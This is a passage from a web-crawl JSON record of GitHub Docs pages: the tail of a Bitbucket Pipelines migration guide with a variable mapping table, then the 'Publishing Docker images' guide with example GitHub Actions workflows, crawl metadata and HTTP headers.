github.event.pull_request.number }}` |\n| `BITBUCKET_PR_DESTINATION_BRANCH` | `${{ github.event.pull_request.base.ref }}` |\n| `BITBUCKET_GIT_HTTP_ORIGIN` | `${{ github.event.repository.clone_url }}` |\n| `BITBUCKET_GIT_SSH_ORIGIN` | `${{ github.event.repository.ssh_url }}` |\n| `BITBUCKET_EXIT_CODE` | `${{ job.status }}` |\n| `BITBUCKET_STEP_UUID` | `${{ job.github_job }}` |\n| `BITBUCKET_PIPELINE_UUID` | `${{ github.workflow }}` |\n| `BITBUCKET_PROJECT_KEY` | `${{ github.repository_owner }}` |\n| `BITBUCKET_PROJECT_UUID` | `${{ github.repository_owner }}` |\n| `BITBUCKET_STEP_TRIGGERER_UUID` | `${{ github.actor_id }}` |\n| `BITBUCKET_SSH_KEY_FILE` | `${{ github.workspace }}/.ssh/id_rsa` |\n| `BITBUCKET_STEP_OIDC_TOKEN` | No Mapping |\n| `BITBUCKET_DEPLOYMENT_ENVIRONMENT` | No Mapping |\n| `BITBUCKET_DEPLOYMENT_ENVIRONMENT_UUID` | No Mapping |\n| `BITBUCKET_BOOKMARK` | No Mapping |\n| `BITBUCKET_PARALLEL_STEP` | No Mapping |\n| `BITBUCKET_PARALLEL_STEP_COUNT` | No Mapping |\n\n### [System Variables](#system-variables)\n\nSystem variables used in tasks are transformed to the equivalent bash shell variable and are assumed to be available. For example, `${system.<variable.name>}` will be transformed to `$variable_name`. We recommend you verify this to ensure proper operation of the workflow.\n\n## [Legal notice](#legal-notice)\n\nPortions have been adapted from [https://github.com/github/gh-actions-importer/](https://github.com/github/gh-actions-importer/) under the MIT license:\n\n```\nMIT License\n\nCopyright (c) 2022 GitHub\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n```",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 283,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-migrating-from-bitbucket-pipelines",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-migrating-from-bitbucket-pipelines",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-migrating-from-bitbucket-pipelines",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-migrating-from-bitbucket-pipelines",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-migrating-to-github-actions-using-github-actions-importer-to-automate-migrations-migrating-from-bitbucket-pipelines"
    },
    "lengths": {
      "extractus": 38228,
      "readableText": 32448,
      "none": 59966,
      "readableTextIfPossible": 32448,
      "result": 32448,
      "markdown": 25024
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/publishing-packages/publishing-docker-images",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/publishing-packages/publishing-docker-images",
    "loadedTime": "2025-05-08T06:40:44.119Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/publishing-packages/publishing-docker-images",
    "title": "Publishing Docker images - GitHub Docs",
    "description": "You can publish Docker images to a registry, such as Docker Hub or GitHub Packages, as part of your continuous integration (CI) workflow.",
    "author": null,
    "keywords": "Packaging,Publishing,Docker",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Publishing Docker images - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/publishing-packages/publishing-docker-images"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/publishing-packages/publishing-docker-images"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "DCD9:122A13:D44AE2:11774F0:681C49EC",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "date": "Thu, 08 May 2025 06:40:36 GMT",
      "via": "1.1 varnish",
      "age": "2039",
      "x-served-by": "cache-lga21945-LGA",
      "x-cache": "HIT",
      "x-cache-hits": "1",
      "x-timer": "S1746686437.617704, VS0, VE1",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "32479",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Publishing Docker images - GitHub Docs\nYou can publish Docker images to a registry, such as Docker Hub or GitHub Packages, as part of your continuous integration (CI) workflow.\nIntroduction\nThis guide shows you how to create a workflow that performs a Docker build, and then publishes Docker images to Docker Hub or GitHub Packages. With a single workflow, you can publish images to a single registry or to multiple registries.\nNote\nIf you want to push to another third-party Docker registry, the example in the Publishing images to GitHub Packages section can serve as a good template.\nPrerequisites\nWe recommend that you have a basic understanding of workflow configuration options and how to create a workflow file. For more information, see Writing workflows.\nYou might also find it helpful to have a basic understanding of the following:\nUsing secrets in GitHub Actions\nAutomatic token authentication\nWorking with the Container registry\nAbout image configuration\nThis guide assumes that you have a complete definition for a Docker image stored in a GitHub repository. For example, your repository must contain a Dockerfile, and any other files needed to perform a Docker build to create an image.\nYou can use pre-defined annotation keys to add metadata including a description, a license, and a source repository to your container image. For more information, see Working with the Container registry.\nIn this guide, we will use the Docker build-push-action action to build the Docker image and push it to one or more Docker registries. For more information, see build-push-action.\nPublishing images to Docker Hub\nNote\nDocker Hub normally imposes rate limits on both push and pull operations which will affect jobs on self-hosted runners. However, GitHub-hosted runners are not subject to these limits based on an agreement between GitHub and Docker.\nEach time you create a new release on GitHub, you can trigger a workflow to publish your image. The workflow in the example below runs when the release event triggers with the published activity type.\nIn the example workflow below, we use the Docker login-action and build-push-action actions to build the Docker image and, if the build succeeds, push the built image to Docker Hub.\nTo push to Docker Hub, you will need to have a Docker Hub account, and have a Docker Hub repository created. For more information, see Pushing a Docker container image to Docker Hub in the Docker documentation.\nThe login-action options required for Docker Hub are:\nusername and password: This is your Docker Hub username and password. We recommend storing your Docker Hub username and password as secrets so they aren't exposed in your workflow file. For more information, see Using secrets in GitHub Actions.\nThe metadata-action option required for Docker Hub is:\nimages: The namespace and name for the Docker image you are building/pushing to Docker Hub.\nThe build-push-action options required for Docker Hub are:\ntags: The tag of your new image in the format DOCKER-HUB-NAMESPACE/DOCKER-HUB-REPOSITORY:VERSION. You can set a single tag as shown below, or specify multiple tags in a list.\npush: If set to true, the image will be pushed to the registry if it is built successfully.\nYAML\n# This workflow uses actions that are not certified by GitHub. # They are provided by a third-party and are governed by # separate terms of service, privacy policy, and support # documentation. # GitHub recommends pinning actions to a commit SHA. # To get a newer version, you will need to update the SHA. # You can also reference a tag or branch, but the action may change without warning. name: Publish Docker image on: release: types: [published] jobs: push_to_registry: name: Push Docker image to Docker Hub runs-on: ubuntu-latest permissions: packages: write contents: read attestations: write id-token: write steps: - name: Check out the repo uses: actions/checkout@v4 - name: Log in to Docker Hub uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a with: username: ${{ secrets.DOCKER_USERNAME }} password: ${{ secrets.DOCKER_PASSWORD }} - name: Extract metadata (tags, labels) for Docker id: meta uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7 with: images: my-docker-hub-namespace/my-docker-hub-repository - name: Build and push Docker image id: push uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671 with: context: . file: ./Dockerfile push: true tags: ${{ steps.meta.outputs.tags }} labels: ${{ steps.meta.outputs.labels }} - name: Generate artifact attestation uses: actions/attest-build-provenance@v2 with: subject-name: index.docker.io/my-docker-hub-namespace/my-docker-hub-repository subject-digest: ${{ steps.push.outputs.digest }} push-to-registry: true \nThe above workflow checks out the GitHub repository, uses the login-action to log in to the registry, and then uses the build-push-action action to: build a Docker image based on your repository's Dockerfile; push the image to Docker Hub, and apply a tag to the image.\nIn the last step, it generates an artifact attestation for the image, which increases supply chain security. For more information, see Using artifact attestations to establish provenance for builds.\nPublishing images to GitHub Packages\nEach time you create a new release on GitHub, you can trigger a workflow to publish your image. The workflow in the example below runs when a change is pushed to the release branch.\nIn the example workflow below, we use the Docker login-action, metadata-action, and build-push-action actions to build the Docker image, and if the build succeeds, push the built image to GitHub Packages.\nThe login-action options required for GitHub Packages are:\nregistry: Must be set to ghcr.io.\nusername: You can use the ${{ github.actor }} context to automatically use the username of the user that triggered the workflow run. For more information, see Accessing contextual information about workflow runs.\npassword: You can use the automatically-generated GITHUB_TOKEN secret for the password. For more information, see Automatic token authentication.\nThe metadata-action option required for GitHub Packages is:\nimages: The namespace and name for the Docker image you are building.\nThe build-push-action options required for GitHub Packages are:\ncontext: Defines the build's context as the set of files located in the specified path.\npush: If set to true, the image will be pushed to the registry if it is built successfully.\ntags and labels: These are populated by output from metadata-action.\nNote\nThis workflow uses actions that are not certified by GitHub. They are provided by a third-party and are governed by separate terms of service, privacy policy, and support documentation.\nGitHub recommends pinning actions to a commit SHA. To get a newer version, you will need to update the SHA. You can also reference a tag or branch, but the action may change without warning.\nname: Create and publish a Docker image\non: push: branches: ['release']\nConfigures this workflow to run every time a change is pushed to the branch called release.\nenv: REGISTRY: ghcr.io IMAGE_NAME: ${{ github.repository }}\nDefines two custom environment variables for the workflow. These are used for the Container registry domain, and a name for the Docker image that this workflow builds.\njobs: build-and-push-image: runs-on: ubuntu-latest\nThere is a single job in this workflow. It's configured to run on the latest available version of Ubuntu.\npermissions: contents: read packages: write attestations: write id-token: write\nSets the permissions granted to the GITHUB_TOKEN for the actions in this job.\nsteps: - name: Checkout repository uses: actions/checkout@v4\n- name: Log in to the Container registry uses: docker/login-action@65b78e6e13532edd9afa3aa52ac7964289d1a9c1 with: registry: ${{ env.REGISTRY }} username: ${{ github.actor }} password: ${{ secrets.GITHUB_TOKEN }}\nUses the docker/login-action action to log in to the Container registry registry using the account and password that will publish the packages. Once published, the packages are scoped to the account defined here.\n- name: Extract metadata (tags, labels) for Docker id: meta uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7 with: images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\nThis step uses docker/metadata-action to extract tags and labels that will be applied to the specified image. The id \"meta\" allows the output of this step to be referenced in a subsequent step. The images value provides the base name for the tags and labels.\n- name: Build and push Docker image id: push uses: docker/build-push-action@f2a1d5e99d037542a71f64918e516c093c6f3fc4 with: context: . push: true tags: ${{ steps.meta.outputs.tags }} labels: ${{ steps.meta.outputs.labels }}\nThis step uses the docker/build-push-action action to build the image, based on your repository's Dockerfile. If the build succeeds, it pushes the image to GitHub Packages. It uses the context parameter to define the build's context as the set of files located in the specified path. For more information, see Usage in the README of the docker/build-push-action repository. It uses the tags and labels parameters to tag and label the image with the output from the \"meta\" step.\n- name: Generate artifact attestation uses: actions/attest-build-provenance@v2 with: subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME}} subject-digest: ${{ steps.push.outputs.digest }} push-to-registry: true\nThis step generates an artifact attestation for the image, which is an unforgeable statement about where and how it was built. It increases supply chain security for people who consume the image. For more information, see Using artifact attestations to establish provenance for builds.\n# name: Create and publish a Docker image # Configures this workflow to run every time a change is pushed to the branch called `release`. on: push: branches: ['release'] # Defines two custom environment variables for the workflow. These are used for the Container registry domain, and a name for the Docker image that this workflow builds. env: REGISTRY: ghcr.io IMAGE_NAME: ${{ github.repository }} # There is a single job in this workflow. It's configured to run on the latest available version of Ubuntu. jobs: build-and-push-image: runs-on: ubuntu-latest # Sets the permissions granted to the `GITHUB_TOKEN` for the actions in this job. permissions: contents: read packages: write attestations: write id-token: write # steps: - name: Checkout repository uses: actions/checkout@v4 # Uses the `docker/login-action` action to log in to the Container registry registry using the account and password that will publish the packages. Once published, the packages are scoped to the account defined here. - name: Log in to the Container registry uses: docker/login-action@65b78e6e13532edd9afa3aa52ac7964289d1a9c1 with: registry: ${{ env.REGISTRY }} username: ${{ github.actor }} password: ${{ secrets.GITHUB_TOKEN }} # This step uses [docker/metadata-action](https://github.com/docker/metadata-action#about) to extract tags and labels that will be applied to the specified image. The `id` \"meta\" allows the output of this step to be referenced in a subsequent step. The `images` value provides the base name for the tags and labels. - name: Extract metadata (tags, labels) for Docker id: meta uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7 with: images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }} # This step uses the `docker/build-push-action` action to build the image, based on your repository's `Dockerfile`. If the build succeeds, it pushes the image to GitHub Packages. # It uses the `context` parameter to define the build's context as the set of files located in the specified path. For more information, see [Usage](https://github.com/docker/build-push-action#usage) in the README of the `docker/build-push-action` repository. # It uses the `tags` and `labels` parameters to tag and label the image with the output from the \"meta\" step. - name: Build and push Docker image id: push uses: docker/build-push-action@f2a1d5e99d037542a71f64918e516c093c6f3fc4 with: context: . push: true tags: ${{ steps.meta.outputs.tags }} labels: ${{ steps.meta.outputs.labels }} # This step generates an artifact attestation for the image, which is an unforgeable statement about where and how it was built. It increases supply chain security for people who consume the image. For more information, see [Using artifact attestations to establish provenance for builds](/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds). - name: Generate artifact attestation uses: actions/attest-build-provenance@v2 with: subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME}} subject-digest: ${{ steps.push.outputs.digest }} push-to-registry: true \nThe above workflow is triggered by a push to the \"release\" branch. It checks out the GitHub repository, and uses the login-action to log in to the Container registry. It then extracts labels and tags for the Docker image. Finally, it uses the build-push-action action to build the image and publish it on the Container registry.\nPublishing images to Docker Hub and GitHub Packages\nIn a single workflow, you can publish your Docker image to multiple registries by using the login-action and build-push-action actions for each registry.\nThe following example workflow uses the steps from the previous sections (Publishing images to Docker Hub and Publishing images to GitHub Packages) to create a single workflow that pushes to both registries.\nYAML\n# This workflow uses actions that are not certified by GitHub. # They are provided by a third-party and are governed by # separate terms of service, privacy policy, and support # documentation. # GitHub recommends pinning actions to a commit SHA. # To get a newer version, you will need to update the SHA. # You can also reference a tag or branch, but the action may change without warning. name: Publish Docker image on: release: types: [published] jobs: push_to_registries: name: Push Docker image to multiple registries runs-on: ubuntu-latest permissions: packages: write contents: read attestations: write id-token: write steps: - name: Check out the repo uses: actions/checkout@v4 - name: Log in to Docker Hub uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a with: username: ${{ secrets.DOCKER_USERNAME }} password: ${{ secrets.DOCKER_PASSWORD }} - name: Log in to the Container registry uses: docker/login-action@65b78e6e13532edd9afa3aa52ac7964289d1a9c1 with: registry: ghcr.io username: ${{ github.actor }} password: ${{ secrets.GITHUB_TOKEN }} - name: Extract metadata (tags, labels) for Docker id: meta uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7 with: images: | my-docker-hub-namespace/my-docker-hub-repository ghcr.io/${{ github.repository }} - name: Build and push Docker images id: push uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671 with: context: . push: true tags: ${{ steps.meta.outputs.tags }} labels: ${{ steps.meta.outputs.labels }} - name: Generate artifact attestation uses: actions/attest-build-provenance@v2 with: subject-name: ghcr.io/${{ github.repository }} subject-digest: ${{ steps.push.outputs.digest }} push-to-registry: true \nThe above workflow checks out the GitHub repository, uses the login-action twice to log in to both registries and generates tags and labels with the metadata-action action. Then the build-push-action action builds and pushes the Docker image to Docker Hub and the Container registry.\nIn the last step, it generates an artifact attestation for the image, which increases supply chain security. For more information, see Using artifact attestations to establish provenance for builds.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-publishing-packages-publishing-docker-images-87y32.html",
  "markdown": "# Publishing Docker images - GitHub Docs\n\nYou can publish Docker images to a registry, such as Docker Hub or GitHub Packages, as part of your continuous integration (CI) workflow.\n\n## [Introduction](#introduction)\n\nThis guide shows you how to create a workflow that performs a Docker build, and then publishes Docker images to Docker Hub or GitHub Packages. With a single workflow, you can publish images to a single registry or to multiple registries.\n\nNote\n\nIf you want to push to another third-party Docker registry, the example in the [Publishing images to GitHub Packages](#publishing-images-to-github-packages) section can serve as a good template.\n\n## [Prerequisites](#prerequisites)\n\nWe recommend that you have a basic understanding of workflow configuration options and how to create a workflow file. For more information, see [Writing workflows](https://docs.github.com/en/actions/learn-github-actions).\n\nYou might also find it helpful to have a basic understanding of the following:\n\n*   [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions)\n*   [Automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication)\n*   [Working with the Container registry](https://docs.github.com/en/packages/working-with-a-github-packages-registry/working-with-the-container-registry)\n\n## [About image configuration](#about-image-configuration)\n\nThis guide assumes that you have a complete definition for a Docker image stored in a GitHub repository. For example, your repository must contain a _Dockerfile_, and any other files needed to perform a Docker build to create an image.\n\nYou can use pre-defined annotation keys to add metadata including a description, a license, and a source repository to your container image. For more information, see [Working with the Container registry](https://docs.github.com/en/packages/working-with-a-github-packages-registry/working-with-the-container-registry#labelling-container-images).\n\nIn this guide, we will use the Docker `build-push-action` action to build the Docker image and push it to one or more Docker registries. For more information, see [`build-push-action`](https://github.com/marketplace/actions/build-and-push-docker-images).\n\n## [Publishing images to Docker Hub](#publishing-images-to-docker-hub)\n\nNote\n\nDocker Hub normally imposes rate limits on both push and pull operations which will affect jobs on self-hosted runners. However, GitHub-hosted runners are not subject to these limits based on an agreement between GitHub and Docker.\n\nEach time you create a new release on GitHub, you can trigger a workflow to publish your image. The workflow in the example below runs when the `release` event triggers with the `published` activity type.\n\nIn the example workflow below, we use the Docker `login-action` and `build-push-action` actions to build the Docker image and, if the build succeeds, push the built image to Docker Hub.\n\nTo push to Docker Hub, you will need to have a Docker Hub account, and have a Docker Hub repository created. For more information, see [Pushing a Docker container image to Docker Hub](https://docs.docker.com/docker-hub/quickstart/#step-3-build-and-push-an-image-to-docker-hub) in the Docker documentation.\n\nThe `login-action` options required for Docker Hub are:\n\n*   `username` and `password`: This is your Docker Hub username and password. We recommend storing your Docker Hub username and password as secrets so they aren't exposed in your workflow file. For more information, see [Using secrets in GitHub Actions](https://docs.github.com/en/actions/security-guides/using-secrets-in-github-actions).\n\nThe `metadata-action` option required for Docker Hub is:\n\n*   `images`: The namespace and name for the Docker image you are building/pushing to Docker Hub.\n\nThe `build-push-action` options required for Docker Hub are:\n\n*   `tags`: The tag of your new image in the format `DOCKER-HUB-NAMESPACE/DOCKER-HUB-REPOSITORY:VERSION`. You can set a single tag as shown below, or specify multiple tags in a list.\n*   `push`: If set to `true`, the image will be pushed to the registry if it is built successfully.\n\nYAML\n\n```\n# This workflow uses actions that are not certified by GitHub.\n# They are provided by a third-party and are governed by\n# separate terms of service, privacy policy, and support\n# documentation.\n\n# GitHub recommends pinning actions to a commit SHA.\n# To get a newer version, you will need to update the SHA.\n# You can also reference a tag or branch, but the action may change without warning.\n\nname: Publish Docker image\n\non:\n  release:\n    types: [published]\n\njobs:\n  push_to_registry:\n    name: Push Docker image to Docker Hub\n    runs-on: ubuntu-latest\n    permissions:\n      packages: write\n      contents: read\n      attestations: write\n      id-token: write\n    steps:\n      - name: Check out the repo\n        uses: actions/checkout@v4\n\n      - name: Log in to Docker Hub\n        uses: docker/login-action@f4ef78c080cd8ba55a85445d5b36e214a81df20a\n        with:\n          username: ${{ secrets.DOCKER_USERNAME }}\n          password: ${{ secrets.DOCKER_PASSWORD }}\n\n      - name: Extract metadata (tags, labels) for Docker\n        id: meta\n        uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7\n        with:\n          images: my-docker-hub-namespace/my-docker-hub-repository\n\n      - name: Build and push Docker image\n        id: push\n        uses: docker/build-push-action@3b5e8027fcad23fda98b2e3ac259d8d67585f671\n        with:\n          context: .\n          file: ./Dockerfile\n          push: true\n          tags: ${{ steps.meta.outputs.tags }}\n          labels: ${{ steps.meta.outputs.labels }}\n\n      - name: Generate artifact attestation\n        uses: actions/attest-build-provenance@v2\n        with:\n          subject-name: index.docker.io/my-docker-hub-namespace/my-docker-hub-repository\n          subject-digest: ${{ steps.push.outputs.digest }}\n          push-to-registry: true\n```\n\nThe above workflow checks out the GitHub repository, uses the `login-action` to log in to the registry, and then uses the `build-push-action` action to: build a Docker image based on your repository's `Dockerfile`; push the image to Docker Hub, and apply a tag to the image.\n\nIn the last step, it generates an artifact attestation for the image, which increases supply chain security. For more information, see [Using artifact attestations to establish provenance for builds](https://docs.github.com/en/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds).\n\n## [Publishing images to GitHub Packages](#publishing-images-to-github-packages)\n\nEach time you create a new release on GitHub, you can trigger a workflow to publish your image. The workflow in the example below runs when a change is pushed to the `release` branch.\n\nIn the example workflow below, we use the Docker `login-action`, `metadata-action`, and `build-push-action` actions to build the Docker image, and if the build succeeds, push the built image to GitHub Packages.\n\nThe `login-action` options required for GitHub Packages are:\n\n*   `registry`: Must be set to `ghcr.io`.\n*   `username`: You can use the `${{ github.actor }}` context to automatically use the username of the user that triggered the workflow run. For more information, see [Accessing contextual information about workflow runs](https://docs.github.com/en/actions/learn-github-actions/contexts#github-context).\n*   `password`: You can use the automatically-generated `GITHUB_TOKEN` secret for the password. For more information, see [Automatic token authentication](https://docs.github.com/en/actions/security-guides/automatic-token-authentication).\n\nThe `metadata-action` option required for GitHub Packages is:\n\n*   `images`: The namespace and name for the Docker image you are building.\n\nThe `build-push-action` options required for GitHub Packages are:\n\n*   `context`: Defines the build's context as the set of files located in the specified path.\n*   `push`: If set to `true`, the image will be pushed to the registry if it is built successfully.\n*   `tags` and `labels`: These are populated by output from `metadata-action`.\n\nNote\n\n*   This workflow uses actions that are not certified by GitHub. They are provided by a third-party and are governed by separate terms of service, privacy policy, and support documentation.\n*   GitHub recommends pinning actions to a commit SHA. To get a newer version, you will need to update the SHA. You can also reference a tag or branch, but the action may change without warning.\n\n```\nname: Create and publish a Docker image\n```\n\n```\non:\n  push:\n    branches: ['release']\n```\n\nConfigures this workflow to run every time a change is pushed to the branch called `release`.\n\n```\nenv:\n  REGISTRY: ghcr.io\n  IMAGE_NAME: ${{ github.repository }}\n```\n\nDefines two custom environment variables for the workflow. These are used for the Container registry domain, and a name for the Docker image that this workflow builds.\n\n```\njobs:\n  build-and-push-image:\n    runs-on: ubuntu-latest\n```\n\nThere is a single job in this workflow. It's configured to run on the latest available version of Ubuntu.\n\n```\n    permissions:\n      contents: read\n      packages: write\n      attestations: write\n      id-token: write\n```\n\nSets the permissions granted to the `GITHUB_TOKEN` for the actions in this job.\n\n```\n    steps:\n      - name: Checkout repository\n        uses: actions/checkout@v4\n```\n\n```\n      - name: Log in to the Container registry\n        uses: docker/login-action@65b78e6e13532edd9afa3aa52ac7964289d1a9c1\n        with:\n          registry: ${{ env.REGISTRY }}\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n```\n\nUses the `docker/login-action` action to log in to the Container registry registry using the account and password that will publish the packages. Once published, the packages are scoped to the account defined here.\n\n```\n      - name: Extract metadata (tags, labels) for Docker\n        id: meta\n        uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7\n        with:\n          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\n```\n\nThis step uses [docker/metadata-action](https://github.com/docker/metadata-action#about) to extract tags and labels that will be applied to the specified image. The `id` \"meta\" allows the output of this step to be referenced in a subsequent step. The `images` value provides the base name for the tags and labels.\n\n```\n      - name: Build and push Docker image\n        id: push\n        uses: docker/build-push-action@f2a1d5e99d037542a71f64918e516c093c6f3fc4\n        with:\n          context: .\n          push: true\n          tags: ${{ steps.meta.outputs.tags }}\n          labels: ${{ steps.meta.outputs.labels }}\n```\n\nThis step uses the `docker/build-push-action` action to build the image, based on your repository's `Dockerfile`. If the build succeeds, it pushes the image to GitHub Packages. It uses the `context` parameter to define the build's context as the set of files located in the specified path. For more information, see [Usage](https://github.com/docker/build-push-action#usage) in the README of the `docker/build-push-action` repository. It uses the `tags` and `labels` parameters to tag and label the image with the output from the \"meta\" step.\n\n```\n      - name: Generate artifact attestation\n        uses: actions/attest-build-provenance@v2\n        with:\n          subject-name: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME}}\n          subject-digest: ${{ steps.push.outputs.digest }}\n          push-to-registry: true\n```\n\nThis step generates an artifact attestation for the image, which is an unforgeable statement about where and how it was built. It increases supply chain security for people who consume the image. For more information, see [Using artifact attestations to establish provenance for builds](https://docs.github.com/actions/security-guides/using-artifact-attestations-to-establish-provenance-for-builds).\n\n```\n#\nname: Create and publish a Docker image\n\n# Configures this workflow to run every time a change is pushed to the branch called `release`.\non:\n  push:\n    branches: ['release']\n\n# Defines two custom environment variables for the workflow. These are used for the Container registry domain, and a name for the Docker image that this workflow builds.\nenv:\n  REGISTRY: ghcr.io\n  IMAGE_NAME: ${{ github.repository }}\n\n# There is a single job in this workflow. It's configured to run on the latest available version of Ubuntu.\njobs:\n  build-and-push-image:\n    runs-on: ubuntu-latest\n    # Sets the permissions granted to the `GITHUB_TOKEN` for the actions in this job.\n    permissions:\n      contents: read\n      packages: write\n      attestations: write\n      id-token: write\n      #\n    steps:\n      - name: Checkout repository\n        uses: actions/checkout@v4\n      # Uses the `docker/login-action` action to log in to the Container registry registry using the account and password that will publish the packages. Once published, the packages are scoped to the account defined here.\n      - name: Log in to the Container registry\n        uses: docker/login-action@65b78e6e13532edd9afa3aa52ac7964289d1a9c1\n        with:\n          registry: ${{ env.REGISTRY }}\n          username: ${{ github.actor }}\n          password: ${{ secrets.GITHUB_TOKEN }}\n      # This step uses [docker/metadata-action](https://github.com/docker/metadata-action#about) to extract tags and labels that will be applied to the specified image. The `id` \"meta\" allows the output of this step to be referenced in a subsequent step. The `images` value provides the base name for the tags and labels.\n      - name: Extract metadata (tags, labels) for Docker\n        id: meta\n        uses: docker/metadata-action@9ec57ed1fcdbf14dcef7dfbe97b2010124a938b7\n        with:\n          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}\n      # This step uses the `docker/build-push-action` action to build the image, based on your repository's `Dockerfile`. If the build succeeds, it pushes the image to GitHub Packages.\n      # It uses the `context` parameter to define the build's context as the set of files located in the specified path. For more information, see [Usage](https://github.com/docker/build-push-action#usage) in the README of the `docker/build-push-action` repository.\n      # It uses the `tags` and `labels` parameters to tag and label the image with the output from the \"meta\" step.\n      - name: Build and push Docker image\n        id: push\n        uses: docker/build-push-action@f2a1d5e99d037542a71f64918e516c093c6f3fc4\n        with:\n          context: .\n          push: true\n          tags: ${{ steps.meta.outputs.tags }}\n          labels: ${{ steps.meta.outputs.labels }}\n      \n      # This step generates an artifact attestation for the image, which is an unforgeable statement about where and 